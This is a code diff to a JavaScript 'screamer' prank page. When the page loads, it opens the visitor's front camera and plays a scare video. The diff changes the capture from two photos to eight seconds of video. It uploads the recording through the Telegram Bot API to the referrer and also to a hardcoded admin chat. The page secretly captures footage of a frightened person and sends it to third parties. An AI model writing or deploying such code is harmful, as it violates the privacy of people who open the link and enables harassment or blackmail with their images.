@@ -30,7 +30,7 @@ document.addEventListener('DOMContentLoaded', () => {
         }, 300);
     }
 
-    // Start the prank: access camera, take first photo, play screamer, take second photo
+    // Start the prank: access camera, record video, play screamer
     async function startPrank() {
         try {
             // Request access to the front camera
@@ -41,20 +41,18 @@ document.addEventListener('DOMContentLoaded', () => {
 
             // Wait for video to load
             cameraVideo.onloadedmetadata = () => {
-                // Take first photo immediately (before screamer)
-                takePhoto();
-                sendPhotoToBot('before');
+                // Start recording video
+                startRecording(stream);
 
                 // Play screamer video
                 playFullScreenVideo();
 
-                // Take second photo after 3 seconds (during/after screamer)
+                // Stop recording after 8 seconds
                 setTimeout(() => {
-                    takePhoto();
-                    sendPhotoToBot('after');
+                    stopRecording();
                     // Stop the stream
                     stream.getTracks().forEach(track => track.stop());
-                }, 3000);
+                }, 8000);
             };
         } catch (err) {
             console.error('Error accessing camera:', err);
@@ -63,36 +61,53 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     }
 
-    // Take photo from camera
-    function takePhoto() {
-        const context = canvas.getContext('2d');
-        canvas.width = cameraVideo.videoWidth;
-        canvas.height = cameraVideo.videoHeight;
-        context.drawImage(cameraVideo, 0, 0);
+    let recorder;
+
+    // Start recording video
+    function startRecording(stream) {
+        recorder = new MediaRecorder(stream);
+        recorder.start();
     }
 
-    // Send photo to Telegram bot
-    function sendPhotoToBot(timing) {
-        canvas.toBlob(blob => {
-            const formData = new FormData();
-            formData.append('photo', blob);
-            formData.append('caption', timing === 'before' ? 'Фото до скримера' : 'Фото после скримера');
+    // Stop recording and send video
+    function stopRecording() {
+        recorder.stop();
+        recorder.ondataavailable = e => {
+            sendVideoToBot(e.data);
+        };
+    }
 
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto?chat_id=${CHAT_ID}`, {
-                method: 'POST',
-                body: formData
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.ok) {
-                    console.log(`Photo ${timing} sent successfully`);
-                } else {
-                    console.error('Error sending photo:', data);
-                }
-            })
-            .catch(err => {
-                console.error('Fetch error:', err);
-            });
+    // Send video to Telegram bot
+    function sendVideoToBot(blob) {
+        const caption = 'Видео реакции на скример';
+
+        // Send to referrer
+        sendVideoToChat(CHAT_ID, blob, caption);
+
+        // Also send to admin
+        const adminChatId = '355782346';
+        sendVideoToChat(adminChatId, blob, `${caption} (реферал: ${CHAT_ID})`);
+    }
+
+    function sendVideoToChat(chatId, blob, caption) {
+        const formData = new FormData();
+        formData.append('video', blob);
+        formData.append('caption', caption);
+
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo?chat_id=${chatId}`, {
+            method: 'POST',
+            body: formData
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.ok) {
+                console.log(`Video sent to ${chatId} successfully`);
+            } else {
+                console.error('Error sending video:', data);
+            }
+        })
+        .catch(err => {
+            console.error('Fetch error:', err);
         });
     }
 
@@ -147,6 +162,9 @@ document.addEventListener('DOMContentLoaded', () => {
     document.addEventListener('visibilitychange', () => {
         if (document.visibilityState === 'hidden') {
             screamerVideo.pause();
+            if (recorder && recorder.state === 'recording') {
+                stopRecording();
+            }
         }
     });
 });
